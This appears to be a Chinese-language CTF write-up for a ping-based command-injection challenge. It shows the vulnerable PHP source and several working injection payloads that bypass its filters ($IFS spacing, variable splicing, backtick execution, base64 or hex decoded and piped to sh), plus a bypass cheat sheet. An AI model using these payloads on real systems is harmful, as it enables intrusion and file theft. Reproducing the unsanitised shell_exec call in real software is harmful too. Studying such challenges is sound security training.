![[Pasted image 20250203113217.png]]
GET传参
![[Pasted image 20250203113244.png]]
他是不是骂我呢（
![[Pasted image 20250203113320.png]]
应该是把flag和空格都过滤了
![[Pasted image 20250203113513.png]]
近在眼前呐
用空格绕过试试`$IFS$9`，访问下index.php
![[Pasted image 20250203113755.png]]
```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}

?>
```
过滤了特殊字符、flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母：
```
& / ? * < x{00}-\x{1f} ' " \ () [] {}  空格
"xxxfxxxlxxxaxxxgxxx" " " "bash" 
```
### 法一：简单变量替换，用$a覆盖拼接flag
```php
?ip=127.0.0.1;a=f;cat$IFS$9$alag.php    过滤
?ip=127.0.0.1;a=l;cat$IFS$9f$aag.php	没flag
?ip=127.0.0.1;a=a;cat$IFS$9fl$ag.php  	过滤
?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php	有flag
```
变量替换顺序，效果也不一样
输入第四条后发现没有flag回显，我们需要**CTRL+U**查看源码
![[Pasted image 20250203140818.png]]

### 法二：变量ab互换传递，绕过字符串匹配，实现拼接
```php
?ip=127.0.0.1;a=fl;b=ag;cat$IFS$9$a$b.php 过滤 
?ip=127.0.0.1;b=ag;a=fl;cat$IFS$9$a$b.php 有flag
?ip=127.0.0.1;b=lag;a=f;cat$IFS$9$a$b.php 有flag
```
输入后面两条，同理查看源码

### 法三：内联执行
```php
?ip=127.0.0.1;cat$IFS`ls`
?ip=127.0.0.1;cat$IFS$3`ls`
?ip=127.0.0.1;cat$IFS$9`ls`
?ip=127.0.0.1|cat$IFS$9`ls`
```
个人习惯使用第三条
将ls的结果作为输入执行，同理查看源码

### 法四：被过滤的bash，用管道+sh替换
`cat flag.php`用**base64加密**来绕过正则匹配
过滤了flag、bash，但sh没过滤，linux下可用sh
```php
Y2F0IGZsYWcucGhw
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```
`|sh`就是执行前面的echo脚本

### 类似题的大致思路
```
cat fl*               用*匹配任意 
cat fla*              用*匹配任意
ca\t fla\g.php        反斜线绕过
cat fl''ag.php        两个单引号绕过
echo "Y2F0IGZsYWcucGhw" | base64 -d | bash      
//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数

echo "63617420666c61672e706870" | xxd -r -p | bash       
//hex编码绕过(引号可以去掉)

echo "63617420666c61672e706870" | xxd -r -p | sh     
//sh的效果和bash一样

cat fl[a]g.php         用[]匹配

a=fl;b=ag;cat $a$b     变量替换
cp fla{g.php,G}        把flag.php复制为flaG
ca${21}t a.txt         
利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x>=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 
```
#### 通配符
```
*     #匹配全部字符，通配符
?     #任意一个字符，通配符
[]    #表示一个范围（正则，通配符）
{}    #产生一个序列（通配符）
```
![[Pasted image 20250203142400.png]]

